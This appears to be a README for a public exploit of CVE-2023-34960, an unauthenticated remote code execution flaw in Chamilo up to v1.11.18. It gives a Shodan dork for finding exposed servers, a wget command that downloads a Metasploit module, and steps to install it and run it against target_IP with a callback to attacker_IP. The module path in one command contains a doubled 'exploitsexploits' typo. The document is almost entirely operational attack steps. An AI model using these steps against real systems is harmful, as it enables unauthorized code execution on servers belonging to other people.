# CVE-2023-34960

![](https://img.shields.io/static/v1?label=Product&message=Chamilo&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=v1.11.*%20up%20to%20v1.11.18&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Unauthenticated%20Remote%20Code%20Execution&color=red)

- Shodan dork:
```
http.component:"Chamilo" 
```

### Install

```
wget https://raw.githubusercontent.com/getdrive/PoC/main/2023/Chamilo_RCE/chamilo_unauth_rce_cve_2023_34960.rb
```
```
cp chamilo_unauth_rce_cve_2023_34960.rb /usr/share/metasploit-framework/modules/exploits/linux/http/
```
```
msfdb reinit; msfconsole -q
```
```
use exploitsexploits/linux/http/chamilo_unauth_rce_cve_2023_34960.rb
```
```
set rhosts target_IP
```
```
set lhost attacker_IP
```
```
run
```
